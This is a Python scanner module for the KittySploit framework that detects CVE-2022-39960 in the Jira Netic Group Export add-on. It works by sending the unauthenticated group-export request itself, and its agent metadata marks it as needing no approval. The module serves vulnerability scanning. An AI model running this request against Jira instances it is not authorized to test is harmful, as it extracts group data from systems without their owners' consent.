#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Jira Netic Group Export add-on before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jira Netic Group Export <1.0.3 - Missing Authorization Detection',
        'description': 'Jira Netic Group Export add-on before 1.0.3 contains a missing authorization vulnerability. The add-on does not perform authorization checks, which can allow an unauthenticated user to export all groups from the Jira instance by making a groupexport_download=true request to a plugins/servlet/groupexportforjira/admin/ URI and thereby potentially obtain sensitive information, modify data, and/or execute unauthorized operations.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'atlassian', 'jira', 'netic', 'unauth', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://gist.github.com/CveCt0r/ca8c6e46f536e9ae69fc6061f132463e',
            'https://marketplace.atlassian.com/apps/1222388/group-export-for-jira/version-history',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-39960',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/Henry4E36/POCS',
        ],
        'cve': 'CVE-2022-39960',
    }

    def run(self):
        path = '/plugins/servlet/groupexportforjira/admin/json'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='groupexport_searchstring=&groupexport_download=true\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"jiraGroupObjects"', '"groupName"',)
        header_any = ('attachment', 'jira-group-export',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='Jira Netic Group Export <1.0.3 - Missing Authorization detected', path=path)
            return True
        return False

